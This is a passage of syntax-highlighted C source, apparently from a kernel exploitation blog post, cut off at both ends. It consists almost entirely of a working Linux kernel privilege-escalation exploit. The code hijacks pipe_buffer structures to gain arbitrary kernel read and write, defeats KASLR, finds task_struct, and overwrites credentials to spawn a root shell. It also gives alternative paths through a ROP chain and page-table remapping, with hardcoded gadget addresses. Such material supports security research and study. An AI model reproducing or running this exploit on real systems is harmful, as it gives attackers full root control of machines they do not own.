class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe pointing to 4th */</span></span><br><span class="line">    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to read */</span></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read out data */</span></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_leaking_by_arbitrary_pipe</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *comm_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line">    setup_evil_pipe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span></span><br><span class="line"><span class="comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span></span><br><span class="line"><span class="comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span></span><br><span class="line"><span class="comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span></span><br><span class="line"><span class="comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    vmemmap_base = (<span class="type">size_t</span>) info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">            kernel_base = buf[<span class="number">0</span>] -  <span class="number">0x070</span>;</span><br><span class="line">            kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">                   kernel_base, kernel_offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now seeking for the task_struct in kernel memory */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * For a machine with MEM less than 256M, we can simply get the:</span></span><br><span class="line"><span class="comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span></span><br><span class="line"><span class="comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span></span><br><span class="line"><span class="comment">     * So we need to find another way to calculate the page_offset_base.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span></span><br><span class="line"><span class="comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * Note that the offset of different filed should be referred to your env.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line">    </span><br><span class="line">        comm_addr = memmem(buf, <span class="number">0xf00</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123;  <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">            parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">            current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">            page_offset_base = (comm_addr[<span class="number">-50</span>]&amp;<span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">            page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                   (<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                   page_offset_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>, current_task);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief find the init_task and copy something to current task_struct</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">        tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) ptask_page_addr, buf);</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (ptask_page_addr+<span class="number">0x40</span>),&amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">        <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_task = parent_task;</span><br><span class="line">    init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">    init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>),</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pgd_addr, mm_struct_addr, *mm_struct_buf;</span><br><span class="line"><span class="type">size_t</span> stack_addr, stack_addr_another;</span><br><span class="line"><span class="type">size_t</span> stack_page, mm_struct_page;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_resolve</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pte_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_resolve_for_3_level</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    <span class="keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vaddr_remapping</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr, <span class="type">size_t</span> paddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr, pte_addr;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">    buf[PTE_ENTRY(vaddr)] = paddr | <span class="number">0x8000000000000867</span>; <span class="comment">/* mark it writable */</span></span><br><span class="line">    arbitrary_write_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,</span><br><span class="line">                            <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pgd_vaddr_resolve</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read current task_struct */</span></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">    mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);</span><br><span class="line"></span><br><span class="line">    mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read mm_struct */</span></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) mm_struct_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (mm_struct_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    mm_struct_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* only this is a virtual addr, others in page table are all physical addr*/</span></span><br><span class="line">    pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * It may also be okay to write ROP chain on pipe_write&#x27;s stack, if there&#x27;s</span></span><br><span class="line"><span class="comment"> * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). </span></span><br><span class="line"><span class="comment"> * But what I want is a more novel and general exploitation that </span></span><br><span class="line"><span class="comment"> * doesn&#x27;t need any information about the kernel image. </span></span><br><span class="line"><span class="comment"> * So just simply overwrite the task_struct is good :)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If you still want a normal ROP, refer to following codes.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff83079ee8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET 0xffffffff810157aa</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>], idx = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* reading the page table directly to get physical addr of kernel stack*/</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);</span><br><span class="line">    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="comment">/* N/X bit */</span></span><br><span class="line">    stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct the ROP */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        rop[idx++] = RET + kernel_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="number">54</span> + kernel_offset;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_usma</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *kcode_map, *kcode_func;</span><br><span class="line">    <span class="type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr 